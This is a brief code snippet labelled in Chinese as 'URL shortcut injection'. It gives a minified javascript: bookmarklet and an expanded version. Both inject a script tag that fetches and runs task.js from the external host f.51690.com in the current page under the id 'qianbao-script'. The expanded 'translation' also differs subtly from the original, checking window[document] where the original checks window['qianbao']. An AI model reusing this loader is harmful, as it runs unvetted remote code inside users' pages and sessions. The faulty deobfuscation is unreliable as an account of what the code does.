//URL快捷方式注入

//压缩码
javascript: void function (g, d, m, s) {
    g[m] ? (g[m].c = 1, g[m]()) : !d[m] && (d.getElementsByTagName("head")[0] || d.body).appendChild(
        (d[m] = 1,
            s = d.createElement("script"), s.setAttribute("charset", "utf-8"), s.id = "qianbao-script",
            s.src = "http://f.51690.com/js/plugin/task.js?r=" + Math.random() * 99999999, s));
}(window, document, "qianbao");

//翻译码
function a() {
    if (window[document]) {
        window["qianbao"].c = 1;
        window["qianbao"]();
    } else {
        if (!document["qianbao"]) {
            document["qianbao"] = 1;
            var s = document.createElement("script");
            s.setAttribute("charset", "utf-8");
            s.id = "qianbao-script";
            s.src = "http://f.51690.com/js/plugin/task.js?r=" + Math.random() * 99999999;
            (document.getElementsByTagName("head")[0] || document.body).appendChild(s);
        }
    }
}
a();